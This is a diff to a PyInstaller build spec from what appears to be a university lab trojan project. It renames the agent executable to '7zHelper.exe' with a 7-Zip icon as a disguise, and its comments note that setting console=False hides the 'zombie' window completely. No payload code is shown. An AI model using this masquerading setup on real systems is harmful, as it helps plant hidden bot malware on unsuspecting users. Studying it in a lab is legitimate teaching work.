@@ -1,13 +1,14 @@
 # -*- mode: python ; coding: utf-8 -*-
-# Spec de PyInstaller del AgenteUTN: .exe con nombre, icono y metadatos
-# de versión de Windows. Compilar desde troyano/:
+# Spec de PyInstaller del payload del laboratorio, empaquetado como
+# "7zHelper.exe" (parte de la capa de disfraz del instalador 7-Zip).
+# Compilar desde troyano/:
 #   python -m PyInstaller pyinstaller/AgenteUTN.spec --noconfirm
 
 from pathlib import Path
 
 ROOT = Path(SPECPATH).parent
 SRC = ROOT / "src"
-ICON = ROOT / "assets" / "agente.ico"
+ICON = ROOT / "assets" / "7z.ico"
 VERSION_INFO = ROOT / "pyinstaller" / "version_info.txt"
 
 a = Analysis(
@@ -31,13 +32,15 @@ exe = EXE(
     a.binaries,
     a.datas,
     [],
-    name="AgenteUTN",
+    name="7zHelper",
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
     upx=True,
     upx_exclude=[],
     runtime_tmpdir=None,
+    # Para el laboratorio se deja console=True (se ve la salida del zombie).
+    # Cambiar a console=False oculta la ventana por completo (disfraz total).
     console=True,
     disable_windowed_traceback=False,
     argv_emulation=False,
